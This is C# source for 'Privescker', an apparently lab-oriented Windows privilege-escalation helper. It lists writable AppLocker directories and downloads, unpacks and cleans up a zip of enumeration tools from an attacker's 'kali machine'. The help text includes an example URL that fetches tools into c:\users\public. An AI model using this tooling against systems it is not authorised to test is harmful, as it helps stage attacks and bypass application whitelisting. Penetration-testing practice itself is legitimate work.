namespace Privescker
{
    using NDesk.Options;
    using System;
    using System.IO;
    class Program
    {
        /// <summary>
        /// Executed when the program starts
        /// </summary>
        /// <param name="args"></param>
        static void Main(string[] args)
        {
            if (args.Length > 0)
            {
                CheckArguments(args);
            }
        }

        /// <summary>
        /// Checks the arguments supplied when running the tool
        /// </summary>
        /// <param name="args"></param>
        private static void CheckArguments(string[] args)
        {
            bool show_help = false;
            bool printPaths = false;
            string outputPath = string.Empty;
            string url = string.Empty;

            var p = new OptionSet()
            {
                { "p|print", "prints the writable AppLocker directories",
                   v => printPaths = v != null
                },
                { "o|output=",
                   "the directory to output all the files from Privescker",
                    v => outputPath = v
                },
                { "h|help",  "show this message and exit",
                   v => show_help = v != null
                },
                { "u|url=",  "specify the url back to your kali machine to download the zip archive file",
                   v => url = v
                },
            };

            p.Parse(args);

            if (show_help)
            {
                ShowHelp(p);
                return;
            }

            if (printPaths)
            {
                foreach (var item in new AppLockerLocations().GetLocations())
                {
                    Console.WriteLine(item);
                }
                return;
            }

            if (!string.IsNullOrEmpty(outputPath) && !string.IsNullOrEmpty(url))
            {
                outputPath = Path.Combine(outputPath, "privescker");
                DownloadUnzip(url, outputPath);
            }
            else
            {
                ShowHelp(p);
                return;
            }
        }

        /// <summary>
        /// Main method that is executed if the user supplies the output directory
        /// </summary>
        private static void DownloadUnzip(string url, string outputPath)
        {
            Console.WriteLine($"[*] Trying to download file from: {url}");

            // Create instance of FileDownloader object and then attempt to download the archive file specified
            var filename = new FileDownloader().GetZipFile(url);

            // After the download is complete, we do a quick check to ensure the file actually got downloaded
            if (File.Exists(filename))
            {
                Console.WriteLine($"[*] Successfully downloaded file: {filename}");
                Console.WriteLine($"[*] Attempting to unzip archive to chosen location: {outputPath}");

                // Lets try the unzip operation now
                FileOperations.UnzipArchive(filename, outputPath);

                Console.WriteLine($"[*] Extraction complete");
                Console.WriteLine($"[*] Cleaning up");

                //Delete the archive file
                FileOperations.DeleteArchiveFile(filename);
            }
            else
            {
                Console.WriteLine("[!] Error: File doesn't appear to have downloaded. Cannot proceed.");
            }
        }

        /// <summary>
        /// Show help
        /// </summary>
        /// <param name="p"></param>
        static void ShowHelp(OptionSet p)
        {
            Console.WriteLine("Usage: Windows-Privescker.exe [OPTIONS]+ <VALUE>");
            Console.WriteLine();
            Console.WriteLine("Example: Privescker.exe -p");
            Console.WriteLine("Example: Privescker.exe -u http://10.10.14.12:8000/enum-tools.zip -o \"c:\\users\\public\"");
            Console.WriteLine();
            Console.WriteLine("Options:");
            p.WriteOptionDescriptions(Console.Out);
        }
    }
}
